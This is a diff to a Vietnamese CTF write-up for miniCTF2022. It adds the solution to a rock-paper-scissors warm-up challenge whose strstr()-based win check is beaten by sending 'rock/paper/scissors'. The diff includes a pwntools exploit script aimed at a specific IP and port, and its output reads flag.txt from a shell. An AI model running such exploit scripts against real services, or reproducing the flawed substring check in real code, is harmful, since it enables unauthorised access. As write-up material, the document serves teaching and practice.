@@ -1,4 +1,4 @@
-# miniCTF2022-deploy
+# Write Up miniCTF2022
 
 # 1. NetCat
 
@@ -124,3 +124,62 @@ ISPCTF{B4s1c_Buff3r_0v3rFl0w}
 ```
 ## Flag
 `ISPCTF{B4s1c_Buff3r_0v3rFl0w}`
+
+# 3. RPS
+
+## Category
+Warm Up
+
+## Question
+>nc 174.138.21.217 3138
+
+## Solution
+Đọc source code ta có thấy chương trình sử dụng `if (strstr(player_turn, loses[computer_turn]))` hàm strstr() để kiểm tra chuỗi người dùng nhập vào `player_turn` có 
+trong chuỗi `loses[computer_turn]` máy tính thua không.
+Nếu có sẽ trả về `true` từ đó ta có 1 lần chiến thắng.
+```
+if (strstr(player_turn, loses[computer_turn])) {
+    puts("You win! Play again?");
+    return true;
+```
+Tận dụng lỗi này ta sẽ nhập `{"rock", "paper", "scissors"}` 5 lần để có thể chiến thắng bằng payload
+```
+halston in ~/CTF/miniCTF2022/warmup/RPS λ cat exploit.py
+from pwn import *
+
+p = remote("174.138.21.217", 3138)
+
+for i in range(5):
+        p.recvuntil(b"Type '2' to exit the program")
+        p.sendline(b"1")
+        p.recvuntil(b"Please make your selection (rock/paper/scissors):")
+        p.sendline(b"rock/paper/scissors")
+
+p.interactive()
+```
+Run payload bằng python
+```
+halston in ~/CTF/miniCTF2022/warmup/RPS λ python3 exploit.py
+[+] Opening connection to 174.138.21.217 on port 3138: Done
+[*] Switching to interactive mode
+
+You played: rock/paper/scissors
+The computer played: rock
+You win! Play again?
+Congrats!!!
+$ ls
+bin
+chall
+dev
+flag.txt
+ld.so
+lib
+lib32
+lib64
+libc.so.6
+$ cat flag.txt
+ISPCTF{d0nt_m4k3_7h3_l091c4l_m1s74k3}
+```
+
+## Flag
+`ISPCTF{d0nt_m4k3_7h3_l091c4l_m1s74k3}`
